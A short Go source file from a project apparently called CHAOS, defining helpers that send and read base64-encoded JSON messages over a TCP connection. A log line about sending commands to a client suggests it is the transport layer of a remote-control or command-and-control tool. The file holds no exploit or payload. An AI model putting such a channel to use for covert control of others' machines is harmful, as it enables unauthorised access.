package network

import (
	"bufio"
	"encoding/base64"
	"encoding/json"
	log "github.com/sirupsen/logrus"
	"github.com/tiagorlampert/CHAOS/internal/models"
	"net"
)

func Send(conn net.Conn, request models.Message) error {
	marshal, err := json.Marshal(request)
	if err != nil {
		return err
	}
	encoded := base64.StdEncoding.EncodeToString(marshal)
	if err := Write(conn, encoded); err != nil {
		log.WithField("cause", err.Error()).Error("error sending command to client")
		return err
	}
	return nil
}

func Read(conn net.Conn) (*models.Message, error) {
	message, err := bufio.NewReader(conn).ReadString('\n')
	if err != nil {
		log.WithField("cause", err.Error()).Error("error reading response from connection")
		return nil, err
	}
	decoded, err := base64.StdEncoding.DecodeString(message)
	if err != nil {
		log.WithField("cause", err.Error()).Error("error decoding response from connection")
		return nil, err
	}
	var response models.Message
	if err := json.Unmarshal(decoded, &response); err != nil {
		return nil, err
	}
	return &response, err
}

func Write(conn net.Conn, v string) error {
	_, err := conn.Write([]byte(v + "\n"))
	return err
}
